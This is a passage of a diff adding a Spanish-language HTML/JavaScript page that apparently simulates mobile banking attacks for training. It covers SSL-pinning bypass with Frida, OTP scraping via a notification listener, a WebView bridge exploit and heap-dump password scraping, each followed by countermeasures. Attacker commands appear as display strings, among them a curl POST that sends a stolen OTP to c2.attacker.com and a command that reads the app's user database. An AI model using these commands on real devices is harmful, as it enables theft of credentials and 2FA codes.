+                        ]
+                    },
+                    {
+                        victimView: () => { setExploitStatus("Frida Hook Active", "danger"); },
+                        attackerCmd: "frida -U -l ssl_bypass.js -f com.target.securebank",
+                        logs: [
+                            "[HOOK] Inyectando script Frida para sobrescribir TrustManager.checkServerTrusted()...",
+                            "[BYPASS] Devuelto 'TRUE' para todas las cadenas X.509 no firmadas por la CA oficial.",
+                            "[SUCCESS] Tráfico cifrado HTTPS decodificado en texto plano en mitmproxy."
+                        ]
+                    },
+                    {
+                        victimView: () => {
+                            const capturedBox = document.getElementById('intercepted-data-box');
+                            capturedBox.innerHTML = `
+                                <div class="text-purple-400 font-semibold mb-1">[+] Tráfico HTTPS Interceptado (POST /api/login):</div>
+                                <div>Host: <span class="text-white">api.securebank.com</span></div>
+                                <div>Body: <span class="text-amber-300 font-bold">{"user":"47892104X","pass":"Secret2026!"}</span></div>
+                            `;
+                            capturedDataCount++;
+                            updateCapturedBadge();
+                        },
+                        attackerCmd: "mitmdump -q -s 'print(flow.request.content)'",
+                        logs: [
+                            "[CAPTURADO] Petición POST /api/v1/auth interceptada.",
+                            " -> Token Bearer & Credenciales de login extraídas del payload JSON."
+                        ]
+                    }
+                ],
+                defensive: `
+                    <p><strong>Network Security Config:</strong> Definir <code>&lt;pin-set&gt;</code> explícitos en XML.</p>
+                    <p><strong>Anti-Frida:</strong> Implementar comprobaciones NDK para detectar ptrace y puertos TCP de Frida.</p>
+                `
+            },
+            otp: {
+                name: "Notification Listener & Robo de OTP (2FA)",
+                steps: [
+                    {
+                        victimView: () => {
+                            showLayer('layer-sms-prompt');
+                            setExploitStatus("SMS 2FA Recibido", "warning");
+                        },
+                        attackerCmd: "adb shell dumpsys notification",
+                        logs: [
+                            "[+] Generando envío de SMS de prueba con código de verificación 2FA.",
+                            "[+] Notificación emergente renderizada en la pantalla del smartphone."
+                        ]
+                    },
+                    {
+                        victimView: () => { setExploitStatus("Notification Scraped", "danger"); },
+                        attackerCmd: "logcat -s MalwareNotificationService",
+                        logs: [
+                            "[EXPLOIT] Servicio 'NotificationListenerService' malicioso activo.",
+                            "[READ] Interceptado objeto Notification: Package='com.android.mms'.",
+                            "[EXTRACT] Expresión regular aplicada sobre el texto del SMS: Pattern matching (\\d{6})."
+                        ]
+                    },
+                    {
+                        victimView: () => {
+                            const capturedBox = document.getElementById('intercepted-data-box');
+                            capturedBox.innerHTML = `
+                                <div class="text-emerald-400 font-semibold mb-1">[+] Código OTP 2FA Interceptado:</div>
+                                <div>Servicio: <span class="text-white">SMS Bancario</span></div>
+                                <div>Código OTP: <span class="text-emerald-300 font-bold">948201</span></div>
+                            `;
+                            capturedDataCount++;
+                            updateCapturedBadge();
+                        },
+                        attackerCmd: "curl -X POST https://c2.attacker.com/otp -d 'code=948201'",
+                        logs: [
+                            "[SUCCESS] Código 2FA '948201' exfiltrado en tiempo real.",
+                            "[C2] Autenticación robada completada antes de la expiración del token."
+                        ]
+                    }
+                ],
+                defensive: `
+                    <p><strong>Notificaciones Seguras:</strong> Usar <code>VISIBILITY_SECRET</code> en notificaciones de seguridad.</p>
+                    <p><strong>FIDO2 / WebAuthn:</strong> Reemplazar SMS OTP por llaves FIDO2 respaldadas por hardware.</p>
+                `
+            },
+            webview: {
+                name: "WebView & JavaScript Bridge Vulnerable",
+                steps: [
+                    {
+                        victimView: () => {
+                            showLayer('layer-webview-app');
+                            setExploitStatus("WebView Loading", "warning");
+                        },
+                        attackerCmd: "nmap --script http-enum -p 8080 target-app",
+                        logs: [
+                            "[+] Aplicación híbrida iniciando componente WebView.",
+                            "[WARN] Método 'addJavascriptInterface(new NativeBridge(), \"AndroidBridge\")' expuesto a la WebView."
+                        ]
+                    },
+                    {
+                        victimView: () => {
+                            document.getElementById('webview-content').innerHTML = `
+                                <div class="text-red-400 text-[8px] font-mono">
+                                    [EXPLOIT] Injecting Payload:<br>
+                                    AndroidBridge.executeCommand("cat /data/data/com.bank/databases/user.db");
+                                </div>
+                            `;
+                            setExploitStatus("Bridge Exploited", "danger");
+                        },
+                        attackerCmd: "exploit_js_bridge.py --target-interface AndroidBridge",
+                        logs: [
+                            "[EXPLOIT] Inyectando script JS malicioso a través de la URL remota cargada.",
+                            "[BYPASS] Invocando reflexión de clases Java desde JavaScript para ejecutar Runtime.getRuntime().exec()."
+                        ]
+                    },
+                    {
+                        victimView: () => {
+                            const capturedBox = document.getElementById('intercepted-data-box');
+                            capturedBox.innerHTML = `
+                                <div class="text-pink-400 font-semibold mb-1">[+] Base de Datos Exfiltrada vía JS Bridge:</div>
+                                <div>Archivo: <span class="text-white">user.db</span></div>
+                                <div>Tokens: <span class="text-pink-300 font-bold">session_token_xyz9982</span></div>
+                            `;
+                            capturedDataCount++;
+                            updateCapturedBadge();
+                        },
+                        attackerCmd: "cat exfiltrated_database.sqlite",
+                        logs: [
+                            "[SUCCESS] Ejecución remota de código (RCE) en el contexto del proceso de la App.",
+                            "[EXFIL] Base de datos de la app extraída con éxito."
+                        ]
+                    }
+                ],
+                defensive: `
+                    <p><strong>Anotación @JavascriptInterface:</strong> En API 17+, marcar explícitamente solo los métodos seguros.</p>
+                    <p><strong>Desactivar JS:</strong> Usar <code>setJavaScriptEnabled(false)</code> si no es imprescindible.</p>
+                `
+            },
+            heap: {
+                name: "Memory Scraping & Heap Dump Forensics",
+                steps: [
+                    {
+                        victimView: () => {
+                            showLayer('layer-legit-app');
+                            setExploitStatus("Process Dumped", "warning");
+                        },
+                        attackerCmd: "gdb -p $(pidof com.target.securebank)",
+                        logs: [
+                            "[+] Conectando depurador de memoria al proceso en ejecución (PID 4920).",
+                            "[+] Solicitando volcado completo del Heap de memoria RAM de la App."
+                        ]
+                    },
+                    {
+                        victimView: () => { setExploitStatus("Memory Scraped", "danger"); },
+                        attackerCmd: "am dumpheap com.target.securebank /sdcard/heap.hprof",
+                        logs: [
+                            "[EXPLOIT] Analizando instancias de objetos java.lang.String y char[] en memoria volátil.",
+                            "[READ] Escaneando patrones de texto plano antes de la recolección de basura (Garbage Collector)."
+                        ]
+                    },
+                    {
+                        victimView: () => {
+                            const capturedBox = document.getElementById('intercepted-data-box');
+                            capturedBox.innerHTML = `
+                                <div class="text-cyan-400 font-semibold mb-1">[+] Memoria RAM Extraída (Heap Dump):</div>
+                                <div>Variable: <span class="text-white">char[] userPassword</span></div>
+                                <div>Valor RAM: <span class="text-cyan-300 font-bold">UnencryptedPass2026!</span></div>
+                            `;
+                            capturedDataCount++;
+                            updateCapturedBadge();
+                        },
+                        attackerCmd: "strings /sdcard/heap.hprof | grep -E 'Pass|Secret|Token'",
+                        logs: [
+                            "[SUCCESS] Clave de acceso 'UnencryptedPass2026!' recuperada de la memoria RAM.",
+                            "[ALERT] La contraseña no se almacenó en estructuras borradas explícitamente (`char[]` puesto a cero)."
+                        ]
+                    }
+                ],
+                defensive: `
+                    <p><strong>Manejo de Claves:</strong> Usar <code>char[]</code> en lugar de <code>String</code> para sobrescribir la memoria a cero tras su uso.</p>
+                    <p><strong>Hardware KeyStore:</strong> Almacenar claves dentro de Android KeyStore / Secure Enclave.</p>
+                `
+            }
+        };
+
+        function setOS(os) {
+            currentOS = os;
+            const btnAndroid = document.getElementById('btn-android');
+            const btnIos = document.getElementById('btn-ios');
+            const notch = document.getElementById('phone-notch');
+            const homeBar = document.getElementById('phone-home-indicator');
+            const badge = document.getElementById('active-os-badge');
+
+            if (os === 'android') {
+                btnAndroid.className = "flex items-center space-x-2 px-4 py-1.5 rounded-xl text-xs font-semibold transition-all bg-blue-600 text-white shadow-sm";
+                btnIos.className = "flex items-center space-x-2 px-4 py-1.5 rounded-xl text-xs font-semibold transition-all text-slate-400 hover:text-white";
+                notch.className = "w-4 h-4 bg-black rounded-full border border-slate-800";
+                homeBar.className = "w-16 h-1 bg-slate-600 rounded-full";
+                badge.innerText = "Android ART";
+                document.getElementById('ble-modal-title').innerText = "Vincular dispositivo Bluetooth";
+            } else {
+                btnIos.className = "flex items-center space-x-2 px-4 py-1.5 rounded-xl text-xs font-semibold transition-all bg-blue-600 text-white shadow-sm";
+                btnAndroid.className = "flex items-center space-x-2 px-4 py-1.5 rounded-xl text-xs font-semibold transition-all text-slate-400 hover:text-white";
+                notch.className = "w-20 h-3.5 bg-black rounded-full flex items-center justify-center space-x-1.5";
+                homeBar.className = "w-24 h-1 bg-slate-400 rounded-full";
+                badge.innerText = "iOS Sandbox";
+                document.getElementById('ble-modal-title').innerText = "Solicitud de enlazar Bluetooth";
+            }
+            appendLog(`[SYSTEM] Sistema operativo de la maqueta ajustado a: ${os.toUpperCase()}`);
+        }
+
+        function selectVector(vectorKey) {
+            currentVector = vectorKey;
+            currentStep = 0;
+
+            document.querySelectorAll('[id^="vec-"]').forEach(btn => {
+                btn.classList.remove('border-blue-500', 'bg-blue-950/40');
+            });
+            document.getElementById(`vec-${vectorKey}`).classList.add('border-blue-500', 'bg-blue-950/40');
+
+            resetMobileScreens();
+            const scenario = vectorScenarios[vectorKey];
+            appendLog(`================================================`);
+            appendLog(`[MÓDULO] ${scenario.name}`);
+            appendLog(`[INFO] Presiona 'Ejecutar Paso' para observar el cambio en la pantalla del Smartphone.`);
+            
+            document.getElementById('defensive-content').innerHTML = scenario.defensive;
+            document.getElementById('btn-exec-text').innerText = "Iniciar Paso 1";
+            setExploitStatus("Módulo Listo", "warning");
+        }
+
+        function triggerAttackStep() {
+            if (!currentVector) {
+                alert("Selecciona uno de los 7 vectores de ataque primero.");
+                return;
+            }
+
+            const scenario = vectorScenarios[currentVector];
+            if (currentStep < scenario.steps.length) {
+                const stepData = scenario.steps[currentStep];
+                stepData.victimView();
+                document.getElementById('console-cmd-input').value = stepData.attackerCmd;
+                stepData.logs.forEach(log => appendLog(log));
+
+                currentStep++;
+                if (currentStep < scenario.steps.length) {
+                    document.getElementById('btn-exec-text').innerText = `Ejecutar Paso ${currentStep + 1}`;
+                } else {
+                    document.getElementById('btn-exec-text').innerText = "Completado";
+                }
+            } else {
+                appendLog("[INFO] Reiniciando secuencia...");
+                currentStep = 0;
+                triggerAttackStep();
+            }
+        }
+
+        function resetSimulation() {
+            currentVector = null;
+            currentStep = 0;
+            resetMobileScreens();
+            document.querySelectorAll('[id^="vec-"]').forEach(btn => {
+                btn.classList.remove('border-blue-500', 'bg-blue-950/40');
+            });
+
+            document.getElementById('console-stream').innerHTML = `
+                <div class="text-slate-500 text-[10px]">
+                    [+] Servidor C2 de auditoría listo.<br>
+                    [+] Selecciona un vector de ataque arriba y presiona 'Ejecutar Paso'.<br>
+                    ------------------------------------------------
+                </div>
+            `;
+            document.getElementById('intercepted-data-box').innerHTML = `<span class="text-slate-600 italic">Esperando exfiltración de datos...</span>`;
+            document.getElementById('defensive-content').innerHTML = `<p class="text-slate-400 italic">Selecciona un vector para ver las contramedidas asociadas.</p>`;
+            document.getElementById('btn-exec-text').innerText = "Ejecutar Paso";
+            setExploitStatus("TCP:4444 (LISTEN)", "warning");
+            capturedDataCount = 0;
+            updateCapturedBadge();
+        }
+
+        function resetMobileScreens() {
+            document.getElementById('layer-legit-app').classList.add('hidden');
+            document.getElementById('layer-malicious-overlay').classList.add('hidden');
+            document.getElementById('layer-ota-prompt').classList.add('hidden');
+            document.getElementById('layer-ble-prompt').classList.add('hidden');
+            document.getElementById('layer-sms-prompt').classList.add('hidden');
+            document.getElementById('layer-webview-app').classList.add('hidden');
+        }
+
+        function showLayer(layerId) {
+            resetMobileScreens();
+            document.getElementById(layerId).classList.remove('hidden');
+            document.getElementById(layerId).classList.add('flex');
+        }
+
+        function openVictimApp(appName) {
+            if (appName === 'bank') {
+                showLayer('layer-legit-app');
+                appendLog("[VICTIM_EVENT] La víctima ha abierto la aplicación bancaria.");
+            }
+        }
+
+        function simulateOverlaySubmission() {
+            const pin = document.getElementById('overlay-input-pin').value || "8492";
+            const pass = document.getElementById('overlay-input-pass').value || "SecurePass2026!";
+            appendLog(`[EXFIL] Credenciales capturadas por Overlay: PIN=${pin} | CLAVE=${pass}`);
+            
+            const capturedBox = document.getElementById('intercepted-data-box');
+            capturedBox.innerHTML = `
+                <div class="text-red-400 font-semibold mb-1">[+] Credenciales Interceptadas:</div>
+                <div>User: <span class="text-white">47892104X</span></div>
+                <div>PIN: <span class="text-amber-300 font-bold">${pin}</span></div>
+                <div>Clave: <span class="text-amber-300 font-bold">${pass}</span></div>
+            `;
+            capturedDataCount++;
+            updateCapturedBadge();
+            resetMobileScreens();
+            showLayer('layer-legit-app');
+        }
+
+        function simulateOTAClick() {
+            appendLog("[VICTIM_EVENT] Instalación de APK malicioso aceptada.");
+            resetMobileScreens();
+            setExploitStatus("APK Payload Executing", "danger");
+        }
+
+        function dismissOTAPrompt() {
+            document.getElementById('layer-ota-prompt').classList.add('hidden');
+        }
+
+        function simulateBLEAccept() {
+            appendLog("[VICTIM_EVENT] Emparejamiento BLE completado.");
+            document.getElementById('layer-ble-prompt').classList.add('hidden');
+            setExploitStatus("Inyección HID Activa", "danger");
+        }
+
+        function dismissBLEPrompt() {
+            document.getElementById('layer-ble-prompt').classList.add('hidden');
+        }
+
+        function appendLog(text) {
+            const stream = document.getElementById('console-stream');
+            const entry = document.createElement('div');
+            
+            if (text.includes('[EXPLOIT]') || text.includes('[ALERT]') || text.includes('[EXFIL]') || text.includes('[ATTACK]')) {
+                entry.className = "text-red-400 font-semibold";
+            } else if (text.includes('[SUCCESS]') || text.includes('[+]')) {
+                entry.className = "text-emerald-400";
+            } else if (text.includes('[WARN]') || text.includes('[!]') || text.includes('[VICTIM_EVENT]')) {
+                entry.className = "text-amber-300";
+            } else {
+                entry.className = "text-blue-300";
+            }
+            
+            entry.innerText = text;
+            stream.appendChild(entry);
+            stream.scrollTop = stream.scrollHeight;
+        }
+
+        function setExploitStatus(statusText, type) {
+            const statusEl = document.getElementById('exploit-status');
+            let colorClass = type === 'danger' ? "text-red-400 bg-red-950/60 border-red-800/40" : (type === 'success' ? "text-emerald-400 bg-emerald-950/60 border-emerald-800/40" : "text-amber-400 bg-amber-950/60 border-amber-800/40");
+
+            statusEl.className = `text-[9px] font-mono px-2 py-0.5 rounded border ${colorClass}`;
+            statusEl.innerText = statusText;
+        }
+
+        function updateCapturedBadge() {
+            document.getElementById('data-count-badge').innerText = `${capturedDataCount} Captura(s)`;
+        }
+
+        setInterval(() => {
+            const now = new Date();
+            const hours = String(now.getHours()).padStart(2, '0');
+            const minutes = String(now.getMinutes()).padStart(2, '0');
+            document.getElementById('phone-time').innerText = `${hours}:${minutes}`;
+        }, 1000);
+    </script>
+</body>
+</html>
